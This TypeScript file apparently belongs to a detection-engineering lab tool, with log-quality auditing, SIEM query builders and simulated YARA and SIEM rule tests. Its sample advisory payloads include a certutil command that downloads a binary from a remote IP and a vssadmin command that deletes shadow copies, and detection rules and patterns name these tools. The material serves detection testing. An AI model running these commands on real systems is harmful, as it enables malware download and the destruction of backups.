      reply_code: 'DNS response status (NOERROR, NXDOMAIN). High NXDOMAIN counts indicate DGA activity.'
    },
    gpo_remediation: 'Enable query logging on local DNS servers (Bind9, Windows DNS Server, or Infoblox) and ingest logs. In cloud environments, enable Route 53 Query Logging or Azure DNS Private Resolver Query Logs.'
  }
};

export function analyzeLogQuality(sourceType: string, record: any): AuditReport {
  const req = TELEMETRY_REQUIREMENTS[sourceType];
  if (!req) {
    throw new Error(`Unknown source type: ${sourceType}`);
  }

  const checked_fields: AuditFieldReport[] = [];
  const missing_fields: string[] = [];
  let present_count = 0;

  for (const [field, desc] of Object.entries(req.required_fields)) {
    let val: any = record[field];
    if (val === undefined && field.includes('.')) {
      const parts = field.split('.');
      let temp = record;
      for (const part of parts) {
        if (temp && typeof temp === 'object' && part in temp) {
          temp = temp[part];
        } else {
          temp = undefined;
          break;
        }
      }
      val = temp;
    }
    if (val === undefined && field.includes('.')) {
      val = record[field.replace(/\./g, '_')];
    }

    const isPresent = val !== undefined && val !== null && String(val).trim() !== '';

    if (isPresent) {
      present_count++;
      let valDisplay = String(val);
      if (valDisplay.length > 50) valDisplay = valDisplay.slice(0, 50) + '...';
      checked_fields.push({
        field,
        description: desc,
        status: 'Present',
        value: valDisplay
      });
    } else {
      missing_fields.push(field);
      checked_fields.push({
        field,
        description: desc,
        status: 'Missing',
        value: 'N/A'
      });
    }
  }

  const total = Object.keys(req.required_fields).length;
  const health_score = Math.round((present_count / total) * 100);
  const status = health_score >= 80 ? 'HEALTHY' : (health_score >= 50 ? 'WARNING' : 'CRITICAL');

  return {
    log_source_name: req.name,
    health_score,
    status,
    checked_fields,
    missing_fields,
    gpo_remediation: req.gpo_remediation,
    sysmon_remediation: req.sysmon_remediation
  };
}

// 6. IR QUICK SCOPER QUERY ENGINE
export function generateScopingQueries(hosts: string[], ips: string[], users: string[], hashes: string[]): { splunk: string; kql: string } {
  // Build SPL
  const splClauses: string[] = [];
  if (hosts.length > 0) {
    splClauses.push(`Computer IN (${hosts.map(h => `"${h}"`).join(', ')})`);
  }
  if (ips.length > 0) {
    const escaped = ips.map(ip => `"${ip}"`).join(', ');
    splClauses.push(`(src_ip IN (${escaped}) OR dest_ip IN (${escaped}) OR IpAddress IN (${escaped}))`);
  }
  if (users.length > 0) {
    const escaped = users.map(u => `"${u}"`).join(', ');
    splClauses.push(`(User IN (${escaped}) OR TargetUserName IN (${escaped}) OR user IN (${escaped}))`);
  }
  if (hashes.length > 0) {
    const escaped = hashes.map(h => `"${h}"`).join(', ');
    splClauses.push(`(Hashes IN (${escaped}) OR sha256 IN (${escaped}) OR SHA256 IN (${escaped}))`);
  }
  
  const splunk = splClauses.length > 0
    ? `index=* OR index=_audit\n| search ` + splClauses.join(" OR ")
    : `index=* OR index=_audit\n| search *`;

  // Build KQL
  const kqlClauses: string[] = [];
  if (hosts.length > 0) {
    kqlClauses.push(`Computer in (${hosts.map(h => `"${h}"`).join(', ')})`);
  }
  if (ips.length > 0) {
    const escaped = ips.map(ip => `"${ip}"`).join(', ');
    kqlClauses.push(`(SrcIpAddr in (${escaped}) or DstIpAddr in (${escaped}) or IpAddress in (${escaped}))`);
  }
  if (users.length > 0) {
    const escaped = users.map(u => `"${u}"`).join(', ');
    kqlClauses.push(`(AccountName in (${escaped}) or TargetUserName in (${escaped}) or UserPrincipalName in (${escaped}))`);
  }
  if (hashes.length > 0) {
    const escaped = hashes.map(h => `"${h}"`).join(', ');
    kqlClauses.push(`(SHA256 in (${escaped}) or DeviceProcessEvents_SHA256 in (${escaped}))`);
  }

  const kql = kqlClauses.length > 0
    ? `search in (DeviceProcessEvents, DeviceNetworkEvents, SecurityEvent, AuditLogs, AWSCloudTrail)\n| where ` + kqlClauses.join(" or ")
    : `search in (DeviceProcessEvents, DeviceNetworkEvents, SecurityEvent, AuditLogs, AWSCloudTrail)`;

  return { splunk, kql };
}

// 7. CLIENT-SIDE YAML PARSING
function unquote(str: string): string {
  if ((str.startsWith("'") && str.endsWith("'")) || (str.startsWith('"') && str.endsWith('"'))) {
    return str.substring(1, str.length - 1);
  }
  return str;
}

function parseInlineValue(str: string): any {
  if (str.toLowerCase() === 'true') return true;
  if (str.toLowerCase() === 'false') return false;
  if (/^\d+$/.test(str)) return parseInt(str, 10);
  if (/^\d+\.\d+$/.test(str)) return parseFloat(str);
  return str;
}

function parseInlineArray(str: string): any[] {
  const inner = str.substring(1, str.length - 1);
  const items: string[] = [];
  let current = '';
  let inQuotes = false;
  let quoteChar = '';
  for (let i = 0; i < inner.length; i++) {
    const char = inner[i];
    if ((char === "'" || char === '"') && (i === 0 || inner[i-1] !== '\\')) {
      if (!inQuotes) {
        inQuotes = true;
        quoteChar = char;
      } else if (char === quoteChar) {
        inQuotes = false;
      } else {
        current += char;
      }
    } else if (char === ',' && !inQuotes) {
      items.push(current.trim());
      current = '';
    } else {
      current += char;
    }
  }
  items.push(current.trim());
  return items.map(unquote).map(parseInlineValue);
}

export function parseYaml(yaml: string): any {
  const linesSplit = yaml.split('\n');
  const result: any = {};
  
  const stack: { indent: number; key: string | null; val: any }[] = [
    { indent: -1, key: null, val: result }
  ];

  for (let i = 0; i < linesSplit.length; i++) {
    const rawLine = linesSplit[i];
    const trimmed = rawLine.trim();
    if (!trimmed || trimmed.startsWith('#')) {
      continue;
    }

    const actualIndent = rawLine.length - rawLine.trimStart().length;

    let content = trimmed;
    const commentIdx = content.indexOf('#');
    if (commentIdx !== -1) {
      if (commentIdx === 0 || content[commentIdx - 1] === ' ') {
        content = content.substring(0, commentIdx).trim();
      }
    }

    while (stack.length > 1 && stack[stack.length - 1].indent >= actualIndent) {
      stack.pop();
    }

    const stackTop = stack[stack.length - 1];

    if (content.startsWith('-')) {
      let valText = content.substring(1).trim();
      valText = unquote(valText);

      const parentRecord = stack[stack.length - 2];
      if (parentRecord && stackTop.key) {
        const parentVal = parentRecord.val;
        if (parentVal && typeof parentVal === 'object' && !Array.isArray(parentVal)) {
          if (!Array.isArray(parentVal[stackTop.key])) {
            parentVal[stackTop.key] = [];
            stackTop.val = parentVal[stackTop.key];
          }
        }
      }

      const targetArray = stackTop.val;
      if (Array.isArray(targetArray)) {
        if (valText.includes(':')) {
          const separator = valText.indexOf(':');
          const k = valText.substring(0, separator).trim();
          let v = valText.substring(separator + 1).trim();
          v = unquote(v);
          const itemObj = { [k]: parseInlineValue(v) };
          targetArray.push(itemObj);
          stack.push({ indent: actualIndent, key: k, val: itemObj });
        } else {
          targetArray.push(parseInlineValue(valText));
        }
      }
    } else {
      const separator = content.indexOf(':');
      if (separator !== -1) {
        const key = content.substring(0, separator).trim();
        let valText = content.substring(separator + 1).trim();
        
        let val: any;
        if (valText.startsWith('[') && valText.endsWith(']')) {
          val = parseInlineArray(valText);
        } else if (valText === '') {
          val = {};
        } else {
          valText = unquote(valText);
          val = parseInlineValue(valText);
        }

        const parent = stackTop.val;
        if (parent && typeof parent === 'object' && !Array.isArray(parent)) {
          parent[key] = val;
        }

        stack.push({ indent: actualIndent, key, val });
      }
    }
  }

  return result;
}

export function parseYamlRule(yamlText: string): Rule {
  const raw = parseYaml(yamlText);
  
  const detection: DetectionBlock = {
    condition: raw.detection?.condition || ""
  };
  
  if (raw.detection && typeof raw.detection === 'object') {
    for (const [key, val] of Object.entries(raw.detection)) {
      if (key !== 'condition') {
        detection[key] = val;
      }
    }
  }

  return {
    id: raw.id || "temp-id-12345",
    title: raw.title || "Untitled Sigma Rule",
    description: raw.description || "",
    status: raw.status || "experimental",
    severity: raw.severity || "medium",
    author: raw.author || "Detection Engineer",
    date: raw.date || new Date().toISOString().split('T')[0],
    tags: Array.isArray(raw.tags) ? raw.tags : [],
    logsource: {
      category: raw.logsource?.category || "",
      product: raw.logsource?.product || "",
      service: raw.logsource?.service || ""
    },
    detection,
    false_positives: Array.isArray(raw.false_positives) ? raw.false_positives : [],
    remediation: {
      title: raw.remediation?.title || "Investigate Alert Trigger",
      steps: Array.isArray(raw.remediation?.steps) 
        ? raw.remediation.steps 
        : ["Review raw telemetry around event timestamps.", "Determine if access or behavior was authorized by business needs."],
      impact: raw.remediation?.impact || undefined,
      cmd: raw.remediation?.cmd || undefined
    },
    yaml_string: yamlText
  };
}

export interface ResilienceReport {
  level: 'Hash' | 'IP' | 'Domain' | 'Host Artifact' | 'Network Artifact' | 'TTP';
  score: number;
  resilience: 'Fragile' | 'Moderate' | 'Resilient';
  colorClass: string;
  explanation: string;
  recommendations: string[];
}

export function analyzeRuleResilience(rule: Rule): ResilienceReport {
  const yamlLower = (rule.yaml_string || "").toLowerCase();
  
  let score = 6;
  let level: 'Hash' | 'IP' | 'Domain' | 'Host Artifact' | 'Network Artifact' | 'TTP' = 'TTP';
  let resilience: 'Fragile' | 'Moderate' | 'Resilient' = 'Resilient';
  let colorClass = 'text-emerald-400 border-emerald-500/30 bg-emerald-500/10';
  let explanation = "This rule targets operational behaviors and tactics (TTPs) rather than ephemeral indicators. It identifies the procedural footprint of an attack, making it highly resilient to adversary shifts.";
  let recommendations: string[] = ["Maintain this rule's behavioral focus by auditing process actions rather than static strings."];

  const hasHashKeys = yamlLower.includes('sha256') || yamlLower.includes('md5') || yamlLower.includes('hash') || yamlLower.includes('hashes');
  const hasIpKeys = yamlLower.includes('ip') || yamlLower.includes('ip_address') || yamlLower.includes('src_ip') || yamlLower.includes('dest_ip') || /\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/.test(yamlLower);
  const hasDomainKeys = yamlLower.includes('domain') || yamlLower.includes('query') || yamlLower.includes('url') || yamlLower.includes('.com') || yamlLower.includes('.net') || yamlLower.includes('.org');

  if (hasHashKeys) {
    score = 1;
    level = 'Hash';
    resilience = 'Fragile';
    colorClass = 'text-rose-400 border-rose-500/30 bg-rose-500/10';
    explanation = "This rule relies on static file hash indicators (Trivial layer of the Pyramid of Pain). File hashes can be trivially changed by the attacker adding single null bytes, completely bypassing this detection.";
    recommendations = [
      "Pivot to behavioral logging: detect process command lines or parent-child launch characteristics.",
      "Incorporate fuzzy hashing (SSDEEP) or import dynamic indicators via threat intelligence feeds."
    ];
  } else if (hasIpKeys) {
    score = 2;
    level = 'IP';
    resilience = 'Fragile';
    colorClass = 'text-rose-400 border-rose-500/30 bg-rose-500/10';
    explanation = "This rule matches static IP addresses (Easy layer of the Pyramid of Pain). Attackers can spin up fresh C2 proxy endpoints or redirect domain resolutions in minutes, rendering this rule useless.";
    recommendations = [
      "Do not hardcode IP lists in rules. Store IPs in dynamic threat feeds or active-list lookups.",
      "Audit network behavior: monitor connection frequencies, destination geography shifts, or bytes transferred ratios."
    ];
  } else if (hasDomainKeys && (yamlLower.includes('filter_common') || yamlLower.includes('query_type') || yamlLower.includes('query_length') || yamlLower.includes('dns'))) {
    if (yamlLower.includes('query_length')) {
      score = 6;
      level = 'TTP';
      resilience = 'Resilient';
      colorClass = 'text-emerald-400 border-emerald-500/30 bg-emerald-500/10';
      explanation = "Although targeting domains, this rule evaluates length characteristics (> 80 characters) and DNS types (TXT/CNAME). This measures the underlying protocol abuse behavior, making it highly resilient.";
      recommendations = [
        "Monitor for high frequencies of NXDOMAIN replies from anomalous endpoints.",
        "Add entropy checks to detect base64/hex encoding inside queries."
      ];
    } else {
      score = 3;
      level = 'Domain';
      resilience = 'Fragile';
      colorClass = 'text-amber-500 border-amber-500/30 bg-amber-500/10';
      explanation = "This rule detects threat activity via static Domain Names (Simple layer of the Pyramid of Pain). Changing domain registration is cheap and quick for threat actors.";
      recommendations = [
        "Incorporate DGA (Domain Generation Algorithm) detection capabilities.",
        "Analyze DNS resolve anomalies: flag domains registered less than 30 days ago resolving from your assets."
      ];
    }
  } else if (yamlLower.includes('targetobject') || yamlLower.includes('registry') || yamlLower.includes('filepath') || yamlLower.includes('file_path')) {
    score = 4;
    level = 'Host Artifact';
    resilience = 'Moderate';
    colorClass = 'text-cyan-400 border-cyan-500/30 bg-cyan-500/10';
    explanation = "This rule targets Windows Registry paths or file structures (Annoying layer of the Pyramid of Pain). Bypassing this requires the adversary to rewrite their installation paths or registry subkey structures.";
    recommendations = [
      "Combine registry modifications with process telemetry: check if the process editing the registry key is an unsigned binary.",
      "Monitor API actions or GPO overrides targeting persistence keys."
    ];
  } else if (yamlLower.includes('certutil') || yamlLower.includes('mimikatz') || yamlLower.includes('procdump') || yamlLower.includes('msmpeng')) {
    score = 5;
    level = 'Host Artifact';
    resilience = 'Moderate';
    colorClass = 'text-emerald-400 border-emerald-500/30 bg-emerald-500/10';
    explanation = "This rule targets specific hacktools or utilities (Certutil/Mimikatz). It causes moderate pain to adversaries as they must switch to alternative tools or compile custom source code variations.";
    recommendations = [
      "Pivot to telemetry signatures: match API calls (e.g. MiniDumpWriteDump calls to LSASS) rather than binary names like Procdump.",
      "Audit process hashes and code signatures to identify binary renaming bypasses."
    ];
  }

  return { level, score, resilience, colorClass, explanation, recommendations };
}

// 8. THREAT INTEL TO DETECTION LAB MODELS & ENGINES
export interface ThreatAdvisory {
  id: string;
  title: string;
  source: string;
  extract: string;
  logicBreakdown: {
    step: string;
    indicator: string;
    translation: string;
  }[];
  yaraCode: string;
  kqlCode: string;
  splCode: string;
  yaraPayload: string; // Default HEX/ASCII payload for testing
  kqlPayload: string;  // Default KQL JSON log
  splPayload: string;  // Default Splunk JSON log
}

export const THREAT_ADVISORIES: ThreatAdvisory[] = [
  {
    id: "apt29-webshell",
    title: "APT29 Web Server Exploitation & Web Shell",
    source: "CISA Advisory AA23-263A (APT29 Target Exchange Servers)",
    extract: "Threat actors associated with APT29 exploited public-facing Exchange servers to establish persistence. Once inside, they uploaded custom ASPX web shells. The binary uploads contain a specific token string 'Sec-WebShell-Token' used to authenticate commands. Secondary behavior includes executing shell operations via Windows utilities, specifically leveraging certutil.exe to download remote C2 components using the '-urlcache' flag.",
    logicBreakdown: [
      {
        step: "Extract File Signatures",
        indicator: "Upload of a binary (MZ executable) containing custom token 'Sec-WebShell-Token'",
        translation: "YARA rule mapping: uint16(0) == 0x5A4D (MZ header) AND ascii string '$token'"
      },
      {
        step: "Identify LOLBAS Download Behavior",
        indicator: "Processes invoking 'certutil.exe' with the caching parameter '-urlcache' to pull down binaries",
        translation: "KQL mapping: DeviceProcessEvents | where ProcessCommandLine has 'certutil.exe' and ProcessCommandLine has '-urlcache'"
      },
      {
        step: "Define Splunk Event Search",
        indicator: "Event ID 1 process launches in Sysmon matching certutil downloader arguments",
        translation: "SPL mapping: index=sysmon EventID=1 CommandLine='*certutil.exe*urlcache*'"
      }
    ],
    yaraCode: `rule APT29_WebShell_Detection {
    meta:
        description = "Detects custom ASPX web shell binary uploaded by APT29"
        author = "Detection Engineer"
        reference = "CISA Alert AA23-263A"
        threat_actor = "APT29"
        date = "2026-06-10"
    strings:
        $magic = { 4D 5A } // MZ file header
        $token = "Sec-WebShell-Token" ascii wide
    condition:
        $magic at 0 and $token
}`,
    kqlCode: `DeviceProcessEvents
| where ProcessCommandLine has "certutil.exe" 
    and ProcessCommandLine has_any ("-urlcache", "-split")
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName`,
    splCode: `index=ep_sysmon sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1 
    CommandLine="*certutil.exe*" (CommandLine="*urlcache*" OR CommandLine="*split*")
| table _time, host, user, ProcessId, CommandLine`,
    yaraPayload: "4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd215365632d5765625368656c6c2d546f6b656e",
    kqlPayload: `{
  "DeviceName": "WS-IIS-PROD01",
  "AccountName": "IIS_IUSRS",
  "ProcessCommandLine": "certutil.exe -urlcache -f http://91.240.118.12/update.bin C:\\\\Windows\\\\Temp\\\\update.exe",
  "InitiatingProcessFileName": "w3wp.exe"
}`,
    splPayload: `{
  "host": "WS-IIS-PROD01",
  "user": "IIS_IUSRS",
  "CommandLine": "certutil.exe -urlcache -f http://91.240.118.12/update.bin C:\\\\Windows\\\\Temp\\\\update.exe",
  "ProcessId": 4821
}`
  },
  {
    id: "lockbit-execution",
    title: "LockBit Ransomware Persistence & Recovery Disruption",
    source: "CISA Advisory AA24-100A (LockBit Ransomware Activity)",
    extract: "Adversaries deploying LockBit ransomware achieve local persistence by modifying Windows registry run keys, creating a subkey value targeting the path '...\\CurrentVersion\\Run\\LockBitUpdate'. The binary then immediately attempts to disrupt system restoration by invoking 'vssadmin.exe delete shadows /all /quiet' to erase volume shadow backup snapshots from disk.",
    logicBreakdown: [
      {
        step: "Extract Persistence Subkeys",
        indicator: "Writes containing 'LockBitUpdate' inside Windows Run keys",
        translation: "YARA rule mapping: matching string 'LockBitUpdate' inside executable memory"
      },
      {
        step: "Identify Shadow Copy Deletion",
        indicator: "Invocation of vssadmin.exe with arguments command 'delete shadows'",
        translation: "KQL mapping: DeviceProcessEvents | where ProcessCommandLine has 'vssadmin.exe' and ProcessCommandLine has 'delete' and ProcessCommandLine has 'shadows'"
      },
      {
        step: "Define Splunk Shadow Alert",
        indicator: "Security Log Event ID 4688 matching volume shadow copy deletion arguments",
        translation: "SPL mapping: index=security EventID=4688 CommandLine='*vssadmin.exe*delete*shadows*'"
      }
    ],
    yaraCode: `rule LockBit_Ransomware_Execution {
    meta:
        description = "Detects LockBit persistence subkeys and execution sequences"
        author = "Detection Engineer"
        reference = "CISA Alert AA24-100A"
        threat_actor = "LockBit Group"
        date = "2026-06-10"
    strings:
        $magic = { 4D 5A } // MZ header
        $registry_key = "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\LockBitUpdate" ascii wide
        $shadow_delete = "vssadmin.exe delete shadows" ascii wide
    condition:
        $magic at 0 and ($registry_key or $shadow_delete)
}`,
    kqlCode: `DeviceProcessEvents
| where ProcessCommandLine has "vssadmin.exe" 
    and ProcessCommandLine has "delete" 
    and ProcessCommandLine has "shadows"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine`,
    splCode: `index=ad_security sourcetype="WinEventLog:Security" EventID=4688 
    NewProcessName="*vssadmin.exe" CommandLine="*delete*" CommandLine="*shadows*"
| table _time, host, SubjectUserName, CommandLine`,
    yaraPayload: "4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000076737361646d696e2e6578652064656c65746520736861646f7773202f616c6c202f7175696574",
    kqlPayload: `{
  "DeviceName": "DC-01",
  "AccountName": "Administrator",
  "ProcessCommandLine": "vssadmin.exe delete shadows /all /quiet"
}`,
    splPayload: `{
  "host": "DC-01",
  "SubjectUserName": "Administrator",
  "CommandLine": "vssadmin.exe delete shadows /all /quiet"
}`
  }
];

export function simulateYaraScan(advisoryId: string, payload: string): { triggered: boolean; matchedStrings: string[]; error: string | null } {
  try {
    const raw = payload.trim();
    let ascii = raw;
    let hex = raw.replace(/\s+/g, "").toLowerCase();

    // Check if it's hex format
    const isHex = /^[0-9a-f]+$/.test(hex) && hex.length % 2 === 0;
    if (isHex) {
      let str = "";
      for (let i = 0; i < hex.length; i += 2) {
        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
      }
      ascii = str;
    } else {
      // If it's ascii, build hex representation for matching
      let h = "";
      for (let i = 0; i < ascii.length; i++) {
        h += ascii.charCodeAt(i).toString(16).padStart(2, "0");
      }
      hex = h;
    }

    const matchedStrings: string[] = [];
    let triggered = false;

    if (advisoryId === "apt29-webshell") {
      const hasMagic = ascii.startsWith("MZ") || hex.startsWith("4d5a");
      const hasToken = ascii.includes("Sec-WebShell-Token");
      if (hasMagic) matchedStrings.push("$magic (MZ header)");
      if (hasToken) matchedStrings.push("$token (\"Sec-WebShell-Token\")");
      triggered = hasMagic && hasToken;
    } else if (advisoryId === "lockbit-execution") {
      const hasMagic = ascii.startsWith("MZ") || hex.startsWith("4d5a");
      const hasRegistry = ascii.includes("LockBitUpdate");
      const hasShadow = ascii.includes("vssadmin.exe delete shadows");

      if (hasMagic) matchedStrings.push("$magic (MZ header)");
      if (hasRegistry) matchedStrings.push("$registry_key (\"LockBitUpdate\")");
      if (hasShadow) matchedStrings.push("$shadow_delete (\"vssadmin.exe delete shadows\")");
      triggered = hasMagic && (hasRegistry || hasShadow);
    }

    return { triggered, matchedStrings, error: null };
  } catch (err: any) {
    return { triggered: false, matchedStrings: [], error: err.message };
  }
}

export function simulateSIEMQuery(advisoryId: string, logType: "kql" | "spl", logText: string): { triggered: boolean; error: string | null } {
  try {
    const record = JSON.parse(logText);
    let triggered = false;

    if (advisoryId === "apt29-webshell") {
      const cmd = String(record.ProcessCommandLine || record.CommandLine || "").toLowerCase();
      triggered = cmd.includes("certutil") && (cmd.includes("urlcache") || cmd.includes("split"));
    } else if (advisoryId === "lockbit-execution") {
      const cmd = String(record.ProcessCommandLine || record.CommandLine || "").toLowerCase();
      triggered = cmd.includes("vssadmin") && cmd.includes("delete") && cmd.includes("shadows");
    }

    return { triggered, error: null };
  } catch (err: any) {
    return { triggered: false, error: `JSON Parse Error: ${err.message}` };
  }
}

